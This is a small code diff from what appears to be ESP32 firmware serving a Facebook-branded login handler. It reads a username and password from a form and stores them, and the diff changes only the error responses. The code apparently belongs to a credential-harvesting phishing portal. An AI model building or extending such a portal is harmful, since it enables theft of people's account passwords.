@@ -94,13 +94,13 @@ void handle_facebook_connection(http_request_t* req, int client_sock) {
         int ret = extract_form_field_to_buffer(req->body, "username", username, 128);
         if (ret != 0) {
             ESP_LOGE("FacebookWebServer", "Failed to extract username");
-            http_send_error_response(client_sock);
+            http_send_bad_request_response(client_sock);
             return;
         }
         ret = extract_form_field_to_buffer(req->body, "password", password, 128);
         if (ret != 0) {
             ESP_LOGE("FacebookWebServer", "Failed to extract password");
-            http_send_error_response(client_sock);
+            http_send_bad_request_response(client_sock);
             return;
         }
         store_credentials(&cred_buffer, username, password);
